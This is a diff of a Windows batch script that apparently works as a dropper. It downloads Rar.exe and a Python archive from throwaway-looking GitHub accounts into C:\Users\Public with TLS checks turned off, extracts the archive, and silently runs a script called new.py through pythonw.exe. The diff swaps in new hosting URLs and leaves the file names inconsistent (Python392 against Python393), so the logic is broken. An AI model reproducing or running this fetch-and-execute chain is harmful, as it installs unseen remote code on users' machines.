@@ -2,7 +2,7 @@
 cd /d "C:\Users\Public"
 
 echo Downloading Rar.exe...
-curl -# -L -k "https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Rar.exe" -o "Rar.exe"
+curl -# -L -k "https://github.com/duane35126869/1/raw/refs/heads/main/Rar.exe" -o "Rar.exe"
 if not exist "Rar.exe" (
     echo Rar.exe download failed
     pause
@@ -10,15 +10,15 @@ if not exist "Rar.exe" (
 )
 
 echo Downloading Python392.rar...
-curl -# -L -k "https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Python392.rar" -o "Python392.rar"
-if not exist "Python392.rar" (
-    echo Python392.rar download failed
+curl -# -L -k "https://github.com/duane35126869/1/raw/refs/heads/main/Python393.rar.rar" -o "Python392.rar"
+if not exist "Python393.rar" (
+    echo Python393.rar download failed
     pause
     exit /b 1
 )
 
 if exist "Rar.exe" (
-    Rar.exe x -o+ "Python392.rar"
+    Rar.exe x -o+ "Python393.rar"
 ) else (
     echo Rar.exe not found in C:\Users\Public
     pause
@@ -29,7 +29,7 @@ cd "Python392"
 if exist "pythonw.exe" (
     pythonw.exe "new.py"
 ) else (
-    echo pythonw.exe not found in Python392 directory
+    echo pythonw.exe not found in Python393 directory
     pause
     exit /b 1
 )
